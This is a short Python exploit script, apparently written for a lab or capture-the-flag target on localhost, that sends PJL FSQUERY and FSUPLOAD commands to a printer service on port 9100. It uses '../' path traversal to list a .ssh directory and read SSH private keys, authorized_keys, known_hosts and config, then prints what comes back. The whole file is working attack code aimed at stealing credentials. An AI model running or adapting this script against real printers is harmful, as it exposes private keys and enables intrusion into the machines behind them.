#!/usr/bin/env python3
"""PJL FSUPLOAD read — list .ssh and try private keys (lp @ 9100)."""
import socket

HOST, PORT = "127.0.0.1", 9100


def pjl(payload: bytes, timeout: float = 10) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((HOST, PORT))
    s.sendall(payload)
    out = b""
    try:
        while len(out) < 20000:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    s.close()
    return out


def query(path: str) -> None:
    r = pjl(f'@PJL FSQUERY NAME="{path}"\r\n'.encode(), 6)
    print("QUERY", path)
    print(r.decode(errors="replace")[:800])


def read(path: str, size: int) -> bytes:
    r = pjl(f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={size}\r\n'.encode(), 10)
    print("READ", path, "size_req", size, "resp_len", len(r))
    print(r[:1200].decode(errors="replace"))
    return r


print("=== FSQUERY ../.ssh ===")
query("../.ssh")

candidates = [
    ("../.ssh/id_rsa", 4096),
    ("../.ssh/id_ed25519", 512),
    ("../.ssh/id_ecdsa", 1024),
    ("../.ssh/authorized_keys", 512),
    ("../.ssh/known_hosts", 1024),
    ("../.ssh/config", 1024),
]

for path, sz in candidates:
    print("\n---")
    read(path, sz)